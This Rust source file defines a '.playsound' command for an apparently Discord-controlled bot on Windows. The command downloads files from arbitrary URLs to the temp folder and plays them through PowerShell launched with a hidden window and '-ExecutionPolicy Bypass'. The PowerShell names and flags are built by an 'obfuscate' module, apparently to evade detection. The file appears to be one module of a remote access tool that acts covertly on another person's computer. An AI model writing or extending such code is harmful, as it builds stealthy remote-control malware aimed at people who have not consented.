use crate::commands::*;
use crate::log_debug;
use anyhow::Result;
use async_trait::async_trait;
use std::sync::Arc;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::Message;
use std::os::windows::process::CommandExt;

const CREATE_NO_WINDOW: u32 = 0x08000000;

pub struct PlaySoundCommand;

#[async_trait]
impl BotCommand for PlaySoundCommand {
    fn name(&self) -> &str { "playsound" }
    fn description(&self) -> &str { "Play a sound file or URL in the background (hidden)" }
    fn category(&self) -> &str { "utility" }
    fn usage(&self) -> &str { ".playsound <file_path_or_url> [volume 0-100]" }
    fn examples(&self) -> &'static [&'static str] {
        &[
            ".playsound C:\\Windows\\Media\\notify.wav",
            ".playsound https://example.com/sound.mp3",
            ".playsound C:\\sound.mp3 50"
        ]
    }
    fn aliases(&self) -> &'static [&'static str] { &["sound", "audio"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let source = match args.next() {
            Some(s) => s.to_string(),
            None => {
                http.create_message(msg.channel_id)
                    .content("**Usage**: `.playsound <file_path_or_url> [volume 0-100]`")
                    .await?;
                return Ok(());
            }
        };

        let volume = args.next()
            .and_then(|v| v.parse::<u32>().ok())
            .unwrap_or(100)
            .min(100);

        // Check if it's a URL or local file
        let is_url = source.starts_with("http://") || source.starts_with("https://");

        if is_url {
            // Download and play from URL
            http.create_message(msg.channel_id)
                .content(&format!("🔊 Downloading and playing sound from URL (volume: {}%)...", volume))
                .await?;

            let source_clone = source.clone();
            let volume_clone = volume;
            
            tokio::spawn(async move {
                if let Err(_e) = Self::play_from_url(&source_clone, volume_clone).await {
                    log_debug!("Failed to play sound from URL: {}", _e);
                }
            });
        } else {
            // Play local file
            let path = std::path::Path::new(&source);
            if !path.exists() {
                http.create_message(msg.channel_id)
                    .content(&format!("**Error**: File not found: `{}`", source))
                    .await?;
                return Ok(());
            }

            http.create_message(msg.channel_id)
                .content(&format!("🔊 Playing sound (volume: {}%): `{}`", volume, source))
                .await?;

            let source_clone = source.clone();
            let volume_clone = volume;
            
            tokio::spawn(async move {
                if let Err(_e) = Self::play_local(&source_clone, volume_clone) {
                    log_debug!("Failed to play local sound: {}", _e);
                }
            });
        }

        Ok(())
    }
}

impl PlaySoundCommand {
    fn play_local(file_path: &str, volume: u32) -> Result<()> {
        // Use WMPlayer.OCX which works better in headless mode
        let vol_level = (volume as f32 / 100.0 * 100.0) as u32;
        
        let ps_script = format!(
            r#"$wmp = New-Object -ComObject WMPlayer.OCX; $wmp.settings.volume = {}; $wmp.URL = '{}'; $wmp.controls.play(); while($wmp.playState -ne 1) {{ Start-Sleep -Milliseconds 500 }}; $wmp.close()"#,
            vol_level,
            file_path.replace("'", "''")
        );

        use crate::utils::obfuscate::{exe, powershell as ps};
        std::process::Command::new(exe::powershell())
            .args(&[&ps::no_profile(), &ps::window_style(), &ps::hidden(), &ps::execution_policy(), &ps::bypass(), &ps::command(), &ps_script])
            .creation_flags(CREATE_NO_WINDOW)
            .spawn()?;

        Ok(())
    }

    async fn play_from_url(url: &str, volume: u32) -> Result<()> {
        // Download to temp file
        let temp_dir = std::env::temp_dir();
        let file_name = url.split('/').last().unwrap_or("sound.mp3");
        let temp_path = temp_dir.join(format!("ksnd_{}", file_name));

        let response = reqwest::get(url).await?;
        let bytes = response.bytes().await?;
        tokio::fs::write(&temp_path, &bytes).await?;

        // Play the downloaded file
        Self::play_local(temp_path.to_str().unwrap_or(""), volume)?;

        // Clean up after a delay
        let temp_path_clone = temp_path.clone();
        tokio::spawn(async move {
            tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
            let _ = tokio::fs::remove_file(temp_path_clone).await;
        });

        Ok(())
    }
}
